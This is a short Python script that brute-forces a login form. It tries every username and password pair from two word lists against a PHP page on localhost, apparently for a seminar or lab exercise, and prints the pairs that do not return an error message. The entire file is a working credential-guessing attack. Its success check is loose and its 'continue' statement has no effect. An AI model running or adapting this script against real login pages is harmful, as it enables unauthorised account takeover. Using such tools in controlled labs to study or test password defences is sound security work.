import requests

url = "http://127.0.0.1/seminar/brute_force/chitChat_secure/index.php"

f = open("usernames.txt", "r")
username_data = f.read()
username_data = username_data.split("\n")
f.close()

f = open("passwords.txt", "r")
password_data = f.read()
password_data = password_data.split("\n")
f.close()

userpass = {} 
for username in username_data: 
	for password in password_data: 
		req = requests.post(url, data={"username":username, "password":password})
		if not("valid username and password" in req.text):
			userpass[username] = password
			continue

print("Login BruteForcer")
for user in userpass: 
	print(user+ ":" + userpass[user])
		

